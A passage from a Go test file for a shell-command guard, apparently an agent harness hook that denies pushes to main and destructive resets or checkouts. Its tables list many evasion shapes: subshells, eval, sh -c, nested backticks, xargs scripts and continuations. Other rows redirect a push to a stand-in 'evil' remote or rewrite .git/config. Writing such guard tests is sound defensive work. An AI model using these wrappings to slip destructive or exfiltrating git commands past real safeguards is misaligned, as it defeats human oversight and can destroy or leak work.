package guard

import (
	"fmt"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/mad01/thismoon/tools/belt/internal/config"
)

// wrappedPushes (MAD-570) are pushes the token walk never saw as a bare git
// word, or saw with a quote or backslash glued to the branch. Each must be
// judged like the plain push it is. The allow rows must stay allowed.
var wrappedPushes = []struct {
	name, command string
	deny          bool
}{
	{"subshell", "(git push origin main)", true},
	{"subshell after a cd", "cd /tmp && (git push origin main)", true},
	{"command substitution", "$(git push origin main)", true},
	{"substitution in a string", `echo "$(git push origin main)"`, true},
	{"substitution in an assignment", "out=$(git push origin main 2>&1)", true},
	{"backticks", "`git push origin main`", true},
	{"nested backticks", "echo `echo \\`git push origin main\\``", true},
	{"nested backticks in a string", "echo \"`echo \\`git push origin main\\``\"", true},
	{"nested backticks in an assignment", "x=`echo \\`git push origin main\\``", true},
	// MAD-672: inside double quotes a backtick body loses the backslash of \"
	// too, and bash drops a backslash-newline between $ and (. bash 3.2, bash
	// 5.3 and zsh 5.9 run the \" pushes and the bare $\ one; only the two
	// bashes run the $\ pushes in a string, which zsh reads as text.
	{
		"escaped quotes in string backticks",
		"echo \"`echo \\\"'\\\"; git push origin main; echo \\\"'\\\"`\"",
		true,
	},
	{
		"escaped quotes in nested string backticks",
		"echo \"`echo \\\"\\`echo \\\\\\\"'\\\\\\\"; git push origin main; " +
			"echo \\\\\\\"'\\\\\\\"\\`\\\"`\"",
		true,
	},
	{
		"escaped quotes in here-string backticks",
		"cat <<<\"`echo \\\"'\\\"; git push origin main; echo \\\"'\\\"`\"",
		true,
	},
	{"$\\ joins ( in a string", "echo \"$\\\n(git push origin main)\"", true},
	{"$\\ joins ( twice in a string", "echo \"$\\\n\\\n(git push origin main)\"", true},
	{"$\\ joins ( in a here-string", "cat <<<\"$\\\n(git push origin main)\"", true},
	{"$\\ joins ( in a bare word", "echo $\\\n(git push origin main)", true},
	{"process substitution", "cat <(git push origin main)", true},
	{"sh -c single quotes", "sh -c 'git push origin main'", true},
	{"bash -c double quotes", `bash -c "git push origin main"`, true},
	{"bash -lc bundle", "bash -lc 'git push origin main'", true},
	{"zsh -c after options", "zsh -o pipefail -c 'git push origin main'", true},
	{"sudo sh -c", "sudo sh -c 'git push origin main'", true},
	{"xargs sh -c", "echo x | xargs sh -c 'git push origin main'", true},
	{"sh -c in a subshell", "(bash -c 'git push origin main')", true},
	{"cd inside sh -c", "sh -c 'cd /tmp && git push origin main'", true},
	{"escaped quote in sh -c", `bash -c "echo \"hi\"; git push origin main"`, true},
	{"eval", `eval "git push origin main"`, true},
	{"continuation before the branch", "git push origin \\\nmain", true},
	{"continuation inside the branch", "git push origin ma\\\nin", true},
	{"continuation before the subcommand", "git \\\n  push origin main", true},
	{"brace group", "{ git push origin main; }", true},
	{"quoted git word", `"git" push origin main`, true},
	{"escaped git word", `g\it push origin main`, true},
	{"quoted branch", `git push origin "main"`, true},
	{"single-quoted branch", "git push origin 'main'", true},
	{"git by path", "/usr/bin/git push origin main", true},
	{"heredoc into bash", "bash <<'EOF'\ngit push origin main\nEOF", true},
	{"heredoc piped into sh", "cat <<'EOF' | sh\ngit push origin main\nEOF", true},
	{"push in a comment", "true # git push origin main", true},

	{"plain push to a feature branch", "git push origin feature", false},
	{"feature push in a subshell", "(git push origin feature)", false},
	{"feature push in sh -c", "sh -c 'git push origin feature'", false},
	{"push words in an echo string", `echo "git push origin main"`, false},
	{"push words in a commit message", `git commit -m "then git push origin main"`, false},
	{"push words after a ; in a string", `echo "done; git push origin main"`, false},
	{"push words in a single-quoted -c echo", `sh -c 'echo "git push origin main"'`, false},
	{
		"escaped backticks in a backtick echo",
		"echo `echo \\\\\\`git push origin main\\\\\\``",
		false,
	},
	{
		"escaped quotes keep a push quoted in string backticks",
		"echo \"`echo \\\"; git push origin main; echo \\\"`\"",
		false,
	},
	{
		"escaped quotes stay in bare backticks",
		"echo `echo \\\"'\\\"; git push origin main; echo \\\"'\\\"`",
		false,
	},
	{
		"escaped quotes stay in backticks inside $( )",
		"echo \"$(echo `echo \\\"'\\\"; git push origin main; echo \\\"'\\\"`)\"",
		false,
	},
	{
		"escaped quotes stay in bare backticks nested in a string",
		"echo \"`echo \\`echo \\\\\\\"'\\\\\\\"; git push origin main; " +
			"echo \\\\\\\"'\\\\\\\"\\``\"",
		false,
	},
	{
		"a join before plain text in a string",
		"echo \"see \\\n(git push origin main) later\"",
		false,
	},
	{"single-quoted $\\ then (", "echo '$\\\n(git push origin main)'", false},
	{"escaped $ then a join in a string", "echo \"\\$\\\n(git push origin main)\"", false},
	{"plain status", "git status", false},
}

func TestGitPushMainWrapped(t *testing.T) {
	for _, tt := range wrappedPushes {
		t.Run(tt.name, func(t *testing.T) {
			g := newGitPushGuard("feature")
			d := g.Check(Input{Event: EventBash, Command: tt.command, Cwd: "/tmp"})
			if (d != nil) != tt.deny {
				t.Errorf("Check(%q) denial = %v, want deny %v", tt.command, d, tt.deny)
			}
		})
	}
}

// TestGitDiscardWrapped runs the wrapped shapes through git-discard with the
// push swapped for a reset: every tree is dirty, so seeing the reset denies.
func TestGitDiscardWrapped(t *testing.T) {
	for _, tt := range wrappedPushes {
		if !tt.deny || strings.Contains(tt.command, "<<") {
			continue
		}
		t.Run(tt.name, func(t *testing.T) {
			g := NewGitDiscard(config.Config{})
			g.resolveRepo = func(string) string { return "github.com/mad01/thismoon" }
			g.emit = func(_, _, _, _ string, _ map[string]string) {}
			g.status = func(string, ...string) (string, bool) { return " M file.go", true }
			command := strings.NewReplacer("push origin ma\\\nin", "reset --hard",
				"push origin \\\nmain", "reset --hard", "push origin 'main'", "reset --hard",
				`push origin "main"`, "reset --hard", "push origin main", "reset --hard").
				Replace(tt.command)
			if d := g.Check(Input{Event: EventBash, Command: command, Cwd: "/tmp"}); d == nil {
				t.Errorf("git-discard allowed %q", command)
			}
		})
	}
}

// standInRow is a command with XX for the git command it runs
// (gitStandIns), and whether the git guards deny it with each one.
type standInRow struct {
	name, command string
	deny          bool
}

// printedBackticks (MAD-672) are backtick printers whose text eval, sh -c or
// a | sh runs, with XX for the git command. The text a backtick prints comes
// from its body with one level of escapes taken off, \" too inside double
// quotes, so each deny row runs XX in bash 3.2, bash 5.3 and zsh 5.9 (the
// leading-; rows in zsh only), like its $( ) twin. In the allow rows the
// same backticks print XX as text no shell runs.
var printedBackticks = []standInRow{
	{"eval of a backtick echo", "eval \"`echo \\\"true; XX\\\"`\"", true},
	{"bash -c of a backtick echo", "bash -c \"`echo \\\"true; XX\\\"`\"", true},
	{"a backtick echo piped into sh", "echo \"`echo \\\"true; XX\\\"`\" | sh", true},
	{"sh -c of a backtick printf", "sh -c \"`printf \\\"%s\\\" \\\"true; XX\\\"`\"", true},
	{"eval of a backtick echo after a ;", "eval \"`echo \\\"; XX; \\\"`\"", true},
	{"eval of a backtick echo of the command", "eval \"`echo \\\"XX\\\"`\"", true},
	{"bash -c of a backtick echo of the command", "bash -c \"`echo \\\"XX\\\"`\"", true},
	{"eval of a $( ) echo", `eval "$(echo "true; XX")"`, true},
	{"bash -c of a $( ) echo", `bash -c "$(echo "true; XX")"`, true},
	{"a $( ) echo piped into sh", `echo "$(echo "true; XX")" | sh`, true},
	{"sh -c of a $( ) printf", `sh -c "$(printf "%s" "true; XX")"`, true},
	{"eval of a $( ) echo after a ;", `eval "$(echo "; XX; ")"`, true},
	{"eval of a $( ) echo of the command", `eval "$(echo "XX")"`, true},
	{"bash -c of a $( ) echo of the command", `bash -c "$(echo "XX")"`, true},
	{"a backtick echo as an echo word", "echo \"`echo \\\"; XX; \\\"`\"", false},
	{"a backtick echo in an assignment", "x=\"`echo \\\"; XX; \\\"`\"", false},
	{"a backtick echo in single-quoted bash -c", "bash -c 'echo \"`echo \\\"; XX; \\\"`\"'", false},
	{"a backtick echo in single-quoted eval", "eval 'echo \"`echo \\\"; XX; \\\"`\"'", false},
	{
		"a backtick echo as a single-quoted bash -c word",
		"bash -c '\"`echo \\\"; XX; \\\"`\"'",
		false,
	},
	{"a backtick echo as a single-quoted eval word", "eval '\"`echo \\\"; XX; \\\"`\"'", false},
	{"a backtick echo nested in a $( )", "echo \"$(echo \"`echo \\\"; XX; \\\"`\")\"", false},
	{"a backtick echo after true as an echo word", "echo \"`echo \\\"true; XX\\\"`\"", false},
	{"a backtick echo after true in an assignment", "x=\"`echo \\\"true; XX\\\"`\"", false},
}

// gitStandIns are the git commands printedBackticks rows run in place of
// XX: a push to main for git-push-main, a checkout and a reset for
// git-discard.
var gitStandIns = []string{"git push origin main", "git checkout -- file.go", "git reset --hard"}

// dirtyRepo is a discardFixture whose tree at /repo holds uncommitted work.
var dirtyRepo = discardFixture{
	repo:  "github.com/mad01/thismoon",
	dirty: map[string]bool{"/repo": true},
}

// TestPrintedBackticks runs printedBackticks through the git guards.
func TestPrintedBackticks(t *testing.T) {
	runStandIns(t, printedBackticks)
}

// codeInCompounds (MAD-672) are an eval and a shell reading its script
// inside a compound command: a { } group, an if, a loop, a case arm, a !, a
// time and a function body, with their $( ) and plain twins. bash 3.2, bash
// 5.3, zsh 5.9 and dash run XX in each deny row (zsh and the bashes only for
// time and the function keyword), and a function body runs it once called,
// so a body is read where it is defined, called or not, and so is a
// function defined inside another's body. In the allow rows the same words
// are text.
var codeInCompounds = []standInRow{
	{"eval in a group", `{ eval "true; XX"; }`, true},
	{"eval in an if", `if true; then eval "true; XX"; fi`, true},
	{"eval in an else", `if false; then :; else eval "true; XX"; fi`, true},
	{"eval as an elif test", `if false; then :; elif eval "true; XX"; then :; fi`, true},
	{"eval in a for", `for i in 1; do eval "true; XX"; done`, true},
	{"eval in a while", `while true; do eval "true; XX"; break; done`, true},
	{"eval in an until", `until false; do eval "true; XX"; break; done`, true},
	{"eval in a case arm", `case x in x) eval "true; XX";; esac`, true},
	{"eval in a case arm with a ( pattern", `case x in (x) eval "true; XX";; esac`, true},
	{"eval behind !", `! eval "true; XX"`, true},
	{"eval behind time", `time eval "true; XX"`, true},
	{"eval after && in a group", `{ true && eval "true; XX"; }`, true},
	{"eval after || in an if", `if true; then false || eval "true; XX"; fi`, true},
	{"eval in a group behind !", `! { eval "true; XX"; }`, true},
	{"eval in a group in an if", `if true; then { eval "true; XX"; }; fi`, true},
	{"eval in a function it calls", `f() { eval "true; XX"; }; f`, true},
	{"eval in a function it never calls", `f() { eval "true; XX"; }`, true},
	{"eval in a function keyword body", `function f { eval "true; XX"; }; f`, true},
	{"eval in a function defined in a function", `outer() { inner() { eval "true; XX"; }; inner; }; outer`, true},
	{"eval three functions down", `a() { b() { c() { eval "true; XX"; }; c; }; b; }; a`, true},
	{"assignment in a group, then eval", `{ x="true; XX"; }; eval "$x"`, true},
	{"assignment in an if, then eval", `if true; then x="true; XX"; fi; eval "$x"`, true},
	{"assignment in a function, then eval", `f() { x="true; XX"; }; f; eval "$x"`, true},
	{"sh in a group reads a pipe", `echo "true; XX" | { sh; }`, true},
	{"eval of a $( ) echo in a group", `{ eval "$(echo "true; XX")"; }`, true},
	{"eval of a $( ) echo in an if", `if true; then eval "$(echo "true; XX")"; fi`, true},
	{"eval of a $( ) echo in a for", `for i in 1; do eval "$(echo "true; XX")"; done`, true},
	{"eval of a $( ) echo in a while", `while true; do eval "$(echo "true; XX")"; break; done`, true},
	{"eval of a $( ) echo behind !", `! eval "$(echo "true; XX")"`, true},
	{"eval of a $( ) echo in a function", `f() { eval "$(echo "true; XX")"; }; f`, true},
	{"eval of a backtick echo in a group", "{ eval \"`echo \\\"true; XX\\\"`\"; }", true},
	{"eval of a backtick echo in an if", "if true; then eval \"`echo \\\"true; XX\\\"`\"; fi", true},
	{"eval of a backtick echo in a for", "for i in 1; do eval \"`echo \\\"true; XX\\\"`\"; done", true},
	{
		"eval of a backtick echo in a while",
		"while true; do eval \"`echo \\\"true; XX\\\"`\"; break; done",
		true,
	},
	{"eval of a backtick echo behind !", "! eval \"`echo \\\"true; XX\\\"`\"", true},
	{"eval of a backtick echo in a function", "f() { eval \"`echo \\\"true; XX\\\"`\"; }; f", true},
	{"eval of a backtick echo in a case arm", "case x in x) eval \"`echo \\\"true; XX\\\"`\";; esac", true},
	{"echo in a group", `{ echo "true; XX"; }`, false},
	{"echo in an if", `if true; then echo "true; XX"; fi`, false},
	{"echo in a function", `f() { echo "true; XX"; }; f`, false},
	{"echo in a function defined in a function", `outer() { inner() { echo "true; XX"; }; inner; }; outer`, false},
	{"echo of an argument in a nested function", `f() { g() { echo "$1"; }; g "$1"; }; f "true; XX"`, false},
	{"a function that runs its arguments", `retry() { "$@"; }; retry git push origin feature`, false},
	{"echo behind !", `! echo "true; XX"`, false},
	{"eval as an echo word", `echo eval "true; XX"`, false},
	{"eval as an echo word in a group", `{ echo eval "true; XX"; }`, false},
	{"printf in a while", `while true; do printf '%s\n' "true; XX"; break; done`, false},
}

// TestCodeInCompounds runs codeInCompounds through the git guards.
func TestCodeInCompounds(t *testing.T) {
	runStandIns(t, codeInCompounds)
}

// xargsScripts (MAD-672) are an xargs that runs the items it reads as a
// shell's script, with $( ), backtick and plain printers in front of it.
// bash 3.2, bash 5.3, zsh 5.9 and dash run XX in each deny row (the -d row
// needs GNU xargs). The items are cut as xargs cuts them and each is read
// on its own, or put in place of -I's string in the script, so a quote that
// spans items or an item that closes the script's quote hides nothing. In
// the allow rows xargs hands the items to a command that runs no code, or
// puts them where they stay text.
var xargsScripts = []standInRow{
	{"-0 sh -c", `printf '%s' "true; XX" | xargs -0 sh -c`, true},
	{"-0 bash -c", `printf '%s' "true; XX" | xargs -0 bash -c`, true},
	{"-0 zsh -c", `printf '%s' "true; XX" | xargs -0 zsh -c`, true},
	{"--null sh -c", `printf '%s' "true; XX" | xargs --null sh -c`, true},
	{"-0 sh -c behind env", `printf '%s' "true; XX" | xargs -0 env sh -c`, true},
	{"-0 sh -c after --", `printf '%s' "true; XX" | xargs -0 -- sh -c`, true},
	{"-0 of an echo", `echo "true; XX" | xargs -0 sh -c`, true},
	{"-I{} sh -c {}", `echo "true; XX" | xargs -I{} sh -c {}`, true},
	{"-I % sh -c %", `echo "true; XX" | xargs -I % sh -c %`, true},
	{"-0I{} bundle", `printf '%s' "true; XX" | xargs -0I{} sh -c {}`, true},
	{"-I{} in an eval", `echo "true; XX" | xargs -I{} sh -c 'eval "{}"'`, true},
	{"-I{} through tee", `echo "true; XX" | tee /dev/null | xargs -I{} sh -c {}`, true},
	{"-d newline", `printf 'true; XX\n' | xargs -d '\n' sh -c`, true},
	{"-0 -n1, the second item", `printf '%s\0' x "true; XX" | xargs -0 -n1 sh -c`, true},
	{"-0 -n1, a quote across items", `printf '%s\0' "echo '" "XX" "'" | xargs -0 -n1 sh -c`, true},
	{"-I{} item closes the script's quote", `printf '%s' 'a"; XX; "b' | xargs -0 -I{} sh -c 'echo "{}"'`, true},
	{"line mode takes the quotes off", `echo "'true; XX'" | xargs sh -c`, true},
	{"a variable printed into -0", `x="true; XX"; printf '%s' "$x" | xargs -0 sh -c`, true},
	{"a here-string", `xargs -0 sh -c <<< "true; XX"`, true},
	{"-a of a <( )", `xargs -a <(printf '%s' "true; XX") -0 sh -c`, true},
	{"in a group", `{ printf '%s' "true; XX" | xargs -0 sh -c; }`, true},
	{"a $( ) printf into -0", `printf '%s' "$(echo "true; XX")" | xargs -0 sh -c`, true},
	{"a $( ) echo into -I{}", `echo "$(echo "true; XX")" | xargs -I{} sh -c {}`, true},
	{"a backtick printf into -0", "printf '%s' \"`echo \\\"true; XX\\\"`\" | xargs -0 sh -c", true},
	{"a backtick printf into -0 bash", "printf '%s' \"`echo \\\"true; XX\\\"`\" | xargs -0 bash -c", true},
	{"a backtick echo into -0", "echo \"`echo \\\"true; XX\\\"`\" | xargs -0 sh -c", true},
	{"a backtick echo into -I{}", "echo \"`echo \\\"true; XX\\\"`\" | xargs -I{} sh -c {}", true},
	{
		"a backtick variable into -0",
		"x=\"`echo \\\"true; XX\\\"`\"; printf '%s' \"$x\" | xargs -0 sh -c",
		true,
	},
	{"xargs echo", `echo "true; XX" | xargs echo`, false},
	{"items as $0 of an echo", `xargs -0 sh -c 'echo "$0"' <<< hello`, false},
	{"-0 gofmt", `find . -name '*.go' -print0 | xargs -0 gofmt -l`, false},
	{"-I{} echo of plain items", `printf '%s\n' a b | xargs -I{} echo {}`, false},
	{"xargs -0 printf", `echo "true; XX" | xargs -0 printf '%s'`, false},
	{"items as arguments of a script", `printf '%s' "true; XX" | xargs -0 sh -c 'printf %s "$1"' _`, false},
	{"-I{} into echo", `echo "fix: XX" | xargs -I{} echo {}`, false},
	{"-I{} inside the script's quotes", `printf '%s' 'fix: XX' | xargs -0 -I{} sh -c 'echo "{}"'`, false},
	{"-I{} items that run nothing", `printf '%s\n' a b | xargs -I{} sh -c 'echo {}'`, false},
}

// TestXargsScripts runs xargsScripts through the git guards.
func TestXargsScripts(t *testing.T) {
	runStandIns(t, xargsScripts)
}

// runStandIns runs each row through git-push-main with the push and through
// git-discard with each discard (gitStandIns), in a dirty tree.
func runStandIns(t *testing.T, rows []standInRow) {
	t.Helper()
	for _, tt := range rows {
		for _, git := range gitStandIns {
			command := strings.ReplaceAll(tt.command, "XX", git)
			t.Run(tt.name+"/"+git, func(t *testing.T) {
				var g Guard = newGitPushGuard("feature")
				if !strings.Contains(git, "push") {
					var warned []string
					g = newDiscardGuard(config.Config{}, dirtyRepo, &warned)
				}
				d := g.Check(Input{Event: EventBash, Command: command, Cwd: "/repo"})
				if (d != nil) != tt.deny {
					t.Errorf("%s Check(%q) denial = %v, want deny %v", g.ID(), command, d, tt.deny)
				}
			})
		}
	}
}

// TestPlainBodiesWithBackticks pins that commit and pull request bodies
// that show backticks and quotes as text pass both git guards.
func TestPlainBodiesWithBackticks(t *testing.T) {
	var warned []string
	guards := []Guard{
		newGitPushGuard("feature"),
		newDiscardGuard(config.Config{}, dirtyRepo, &warned),
	}
	commands := []string{
		"git commit -m \"fix: read \\`x\\` and \\\"y\\\"\"",
		"git commit -F - <<'EOF2'\nfix(belt): read `x` and \"y\"\n\nIt's `z`.\nEOF2",
		"git commit -m \"$(cat <<'EOF2'\nfeat: x `y` \"z\"\nEOF2\n)\"",
		"gh pr create --title x --body \"Use \\`foo\\` with \\\"bar\\\".\"",
		"gh pr create --title x --body \"$(cat <<'EOF2'\nUse `foo` with \"bar\".\nEOF2\n)\"",
	}
	for _, command := range commands {
		for _, g := range guards {
			if d := g.Check(Input{Event: EventBash, Command: command, Cwd: "/repo"}); d != nil {
				t.Errorf("%s denied %q: %v", g.ID(), command, d)
			}
		}
	}
}

// TestGitCommandsAtWrappedDirs pins where a wrapped push is placed: a
// subshell, substitution or -c script starts where the walk is, a cd inside
// one moves nothing outside, and eval runs in the shell itself.
func TestGitCommandsAtWrappedDirs(t *testing.T) {
	tests := []struct{ name, command, want string }{
		{"subshell starts in the walk's dir", "cd /x && (git push)", "/x"},
		{"cd inside a subshell", "(cd /y && git push)", "/y"},
		{"cd inside a subshell stays inside", "(cd /y); git push", "/session"},
		{"substitution stays inside", "echo $(cd /y); git push", "/session"},
		{"sh -c starts in the walk's dir", "cd /x && sh -c 'git push'", "/x"},
		{"cd inside sh -c", "sh -c 'cd /y && git push'", "/y"},
		{"GIT_DIR before sh -c", "GIT_DIR=/r/.git sh -c 'cd /y && git push'", ""},
		{"env -C before sh -c", "env -C /x sh -c 'git push'", ""},
		{"eval moves the shell", `eval "cd /y"; git push`, ""},
		{"eval push", `eval "git push"`, "/session"},
		{"cd in a heredoc body leaves the dir unknown", "bash <<'EOF'\ncd /y\nEOF\ngit push", ""},
		{"backgrounded cd", "cd /y & git push", ""},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := invocationDirs(gitCommandsAt(tt.command, "/session", "push"))
			if len(got) == 0 || got[len(got)-1] != tt.want {
				t.Errorf("gitCommandsAt(%q) dirs = %q, want last %q", tt.command, got, tt.want)
			}
		})
	}
}

// TestGitPushMainUnreadable pins the fail-closed rule for code the reader
// cannot follow: a push found there by the token split is denied unless its
// refspecs name a non-default branch in plain words.
func TestGitPushMainUnreadable(t *testing.T) {
	tests := []struct {
		command string
		deny    bool
	}{
		{"git push origin main\necho \"unterminated", true},
		{"git push\necho \"unterminated", true},
		// An open subshell is a syntax error the shell runs nothing of, but
		// the reader cannot tell which shell reads it, so the unread text is
		// read fail-closed and its push denied.
		{"(git push origin main", true},
		{"git push origin feature\necho \"unterminated", false},
		{"sh -c 'git push origin main; echo \"x'", true},
	}
	for _, tt := range tests {
		g := newGitPushGuard("main")
		d := g.Check(Input{Event: EventBash, Command: tt.command, Cwd: "/tmp"})
		if (d != nil) != tt.deny {
			t.Errorf("Check(%q) denial = %v, want deny %v", tt.command, d, tt.deny)
		}
	}
}

// expandedRefspecs (review finding 4) are refspec words only a shell can
// resolve. On a default branch each may push it, so each is denied.
var expandedRefspecs = []string{
	`git push origin "$(git branch --show-current)"`,
	"git push origin $B",
	`git push -u origin "$BRANCH"`,
	"git push origin $'main'",
	`git push origin $'\x6dain'`,
	"git push origin {main,x}",
	"git push origin ${B:-main}",
	"git push origin `printf main`",
}

// TestGitPushMainExpandedRefspec pins how a refspec word that is not plain
// text is judged: denied on a default branch or where the branch is
// unknown; from a feature branch only the current-branch idioms pass, since
// any other expansion may name main (or a colon and main).
func TestGitPushMainExpandedRefspec(t *testing.T) {
	for _, cmd := range expandedRefspecs {
		for _, current := range []string{"main", ""} {
			if newGitPushGuard(
				current,
			).Check(Input{Event: EventBash, Command: cmd, Cwd: "/tmp"}) ==
				nil {
				t.Errorf("on branch %q, Check(%q) allowed", current, cmd)
			}
		}
	}
	fromFeature := []struct {
		command string
		deny    bool
	}{
		{`git push -u origin "$(git branch --show-current)"`, false},
		{"git push -u origin $(git branch --show-current)", false},
		{"git push -u origin `git branch --show-current`", false},
		{`git push origin "$(git rev-parse --abbrev-ref HEAD)"`, false},
		{`git push origin "$(git symbolic-ref --short HEAD)"`, false},
		{`B=fix/x; git push -u origin "$B"`, false},
		{"git push origin feature", false},
		{"git push origin HEAD:refs/heads/feature", false},
		{"git push origin $B", true},
		{`git push -u origin "$BRANCH"`, true},
		{"git push origin {main,x}", true},
		{"git push origin ${B:-main}", true},
		{"git push origin `printf main`", true},
		{`git push origin "fix-$(date +%s)"`, true},
		{`git push origin "HEAD:$(git branch --show-current)"`, true},
		{`git -C /other push origin "$(git branch --show-current)"`, true},
		{"git push origin 'refs/heads/*:refs/heads/*'", true},
		{"git push origin ma*", true},
	}
	for _, tt := range fromFeature {
		d := newGitPushGuard(
			"feature",
		).Check(Input{Event: EventBash, Command: tt.command, Cwd: "/tmp"})
		if (d != nil) != tt.deny {
			t.Errorf("from feature, Check(%q) denial = %v, want deny %v", tt.command, d, tt.deny)
		}
	}
}

// TestGitPushMainPlainOrigin pins the second half of MAD-570: in an exempt
// repo, a default-branch push is allowed only when it goes to origin with
// nothing in the command that could point origin, or the push, elsewhere.
func TestGitPushMainPlainOrigin(t *testing.T) {
	const dotfiles = "github.com/mad01/dotfiles"
	tests := []struct {
		name, command, pushRemote string
		deny                      bool
	}{
		{"explicit origin", "git push origin main", "", false},
		{"bare push to origin", "git push", "origin", false},
		{"git -C bare push to origin", "git -C /repo push", "origin", false},
		{"harmless prefix", "command git push origin main", "", false},
		{"bare push to another remote", "git push", "upstream", true},
		{"bare push, remote unknown", "git push", "", true},
		{"another remote", "git push upstream main", "", true},
		{"a URL", "git push https://github.com/other/repo.git main", "", true},
		{"an scp URL", "git push git@github.com:other/repo.git main", "", true},
		{"the local repo", "git push . HEAD:main", "", true},
		{"--repo", "git push --repo=upstream", "origin", true},
		{"-c pushurl", "git -c remote.origin.pushurl=https://x/y.git push origin main", "", true},
		{
			"-c pushInsteadOf",
			"git -c url.https://x/.pushInsteadOf=https://github.com/ push origin main",
			"",
			true,
		},
		{"--config-env", "git --config-env=remote.origin.pushurl=U push origin main", "", true},
		{
			"--config-env separate",
			"git --config-env remote.origin.url=U push origin main",
			"",
			true,
		},
		{"GIT_CONFIG_GLOBAL prefix", "GIT_CONFIG_GLOBAL=/tmp/g git push origin main", "", true},
		{"GIT_CONFIG_COUNT prefix", "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=remote.origin.pushurl " +
			"GIT_CONFIG_VALUE_0=https://x/y.git git push origin main", "", true},
		{
			"GIT_CONFIG_PARAMETERS through env",
			"env GIT_CONFIG_PARAMETERS=\"'a.b=c'\" git push origin main",
			"",
			true,
		},
		{
			"exported GIT_CONFIG_GLOBAL",
			"export GIT_CONFIG_GLOBAL=/tmp/g; git push origin main",
			"",
			true,
		},
		{
			"assigned GIT_CONFIG_SYSTEM",
			"GIT_CONFIG_SYSTEM=/tmp/g && git push origin main",
			"",
			true,
		},
		{"HOME prefix", "HOME=/tmp/h git push origin main", "", true},
		{"XDG_CONFIG_HOME prefix", "XDG_CONFIG_HOME=/tmp/x git push origin main", "", true},
		{
			"GIT_SSH_COMMAND prefix",
			"GIT_SSH_COMMAND='ssh -o HostName=x' git push origin main",
			"",
			true,
		},
		{"env -i", "env -i git push origin main", "", true},
		{"sudo", "sudo git push origin main", "", true},
		{
			"config env inside sh -c",
			"GIT_CONFIG_GLOBAL=/tmp/g sh -c 'git push origin main'",
			"",
			true,
		},
		{
			"feature push with a URL is fine",
			"git push https://github.com/other/repo.git feature",
			"",
			false,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			g := NewGitPushMain(config.Config{DirectMainRepos: []string{dotfiles}})
			g.resolveBranch = func(string) string { return "main" }
			g.resolveRepo = func(string) string { return dotfiles }
			g.resolvePushRemote = func(string, string) string { return tt.pushRemote }
			d := g.Check(Input{Event: EventBash, Command: tt.command, Cwd: "/repo"})
			if (d != nil) != tt.deny {
				t.Errorf("Check(%q) denial = %v, want deny %v", tt.command, d, tt.deny)
			}
		})
	}
}

// TestGitPushMainExemptConfigChange (review finding 5): a step in the same
// command that can change where origin, or a bare push, goes drops the
// exemption. The resolvers read the config before the command runs, so they
// cannot see the change.
func TestGitPushMainExemptConfigChange(t *testing.T) {
	const dotfiles = "github.com/mad01/dotfiles"
	t.Setenv("GIT_CONFIG_GLOBAL", "/tmp/belt-test-global-config")
	tests := []struct {
		command string
		deny    bool
	}{
		{"git config remote.origin.pushurl https://e/x && git push origin main", true},
		{"git remote add evil https://e/x; git config remote.pushDefault evil; git push", true},
		{
			`printf '[remote "origin"]\n pushurl = https://e/x\n' >> .git/config; git push origin main`,
			true,
		},
		{
			"git config --global url.https://e/.pushInsteadOf https://github.com/ && git push origin main",
			true,
		},
		{"git config -f .git/config remote.origin.pushurl X; git push origin main", true},
		{"git config --add remote.origin.pushurl https://e/x && git push origin main", true},
		{"git config --replace-all remote.origin.url https://e/x && git push origin main", true},
		{"git config --unset remote.origin.pushurl && git push origin main", true},
		{"git config set remote.origin.pushurl https://e/x && git push origin main", true},
		{"git remote set-url origin https://e/x && git push origin main", true},
		{"git remote rename origin old && git push origin main", true},
		{"git remote remove origin; git push origin main", true},
		{"git branch -u evil/main && git push", true},
		{"cp /tmp/c .git/config && git push origin main", true},
		{"mv /tmp/c .git/config && git push origin main", true},
		{"sed -i '' 's/github.com/e/' .git/config && git push origin main", true},
		{"echo '[url \"https://e/\"]' | tee -a ~/.gitconfig && git push origin main", true},
		{"cat /tmp/c >> ~/.config/git/config; git push origin main", true},
		{`echo x >> "$GIT_CONFIG_GLOBAL"; git push origin main`, true},
		{"echo x >> /tmp/belt-test-global-config; git push origin main", true},
		{`echo x >> "$(git rev-parse --git-dir)/config"; git push origin main`, true},
		{"cd .git && echo x >> config && cd .. && git push origin main", true},
		{`python3 -c 'open(".git/config", "a").write("x")' && git push origin main`, true},
		{`python3 -c 'open(".git/hooks/pre-push", "w")' && git push origin main`, true},
		{"git push origin main && git config remote.origin.pushurl https://e/x", true},

		{"git push origin main", false},
		{"git config --get remote.origin.url && git push origin main", false},
		{"git config user.email && git push origin main", false},
		{"git config --list && git push origin main", false},
		{"git remote -v && git push origin main", false},
		{"git status && git commit -m 'edit .git/config docs' && git push origin main", false},
		{`echo "see .git/config" && git push origin main`, false},

		// Second review, F2: a read-only command that names a git config
		// path only reads it, wherever it stands; prose names nothing.
		{"cat .git/config; git push origin main", false},
		{"ls .git/hooks && git push origin main", false},
		{"grep url .git/config; git push origin main", false},
		{"cat ~/.gitconfig; git push origin main", false},
		{"git push origin main; cat .git/config", false},
		{
			"head -5 .git/config && tail .git/config && wc -l .git/config && git push origin main",
			false,
		},
		{
			"stat .git/config; file .git/config; diff .git/config /tmp/c; git push origin main",
			false,
		},
		{"rg url .git/config; less .git/config; more .git/config; git push origin main", false},
		{"git config --get-all remote.origin.url && git config -l && git push origin main", false},
		{"git remote show origin && git remote get-url origin && git push origin main", false},
		{
			"git commit -m \"$(cat <<'EOF2'\nfix: read .git/config safely\nEOF2\n)\" && git push origin main",
			false,
		},
		{"git push origin main # then cat .git/config", false},

		{"cat /tmp/c > .git/config; git push origin main", true},
		{"grep -v x .git/config >> ~/.gitconfig; git push origin main", true},
		{"rg --pre ./x url .git/config; git push origin main", true},
		{
			"bash <<'EOF'\ngit config remote.origin.pushurl https://e/x\nEOF\ngit push origin main",
			true,
		},
		{
			"cat <<EOF\n$(git config remote.origin.pushurl https://e/x)\nEOF\ngit push origin main",
			true,
		},
		{"tee .git/config < /tmp/c; git push origin main", true},
	}
	for _, tt := range tests {
		g := NewGitPushMain(config.Config{DirectMainRepos: []string{dotfiles}})
		g.resolveBranch = func(string) string { return "main" }
		g.resolveRepo = func(string) string { return dotfiles }
		g.resolvePushRemote = func(string, string) string { return "origin" }
		d := g.Check(Input{Event: EventBash, Command: tt.command, Cwd: "/repo"})
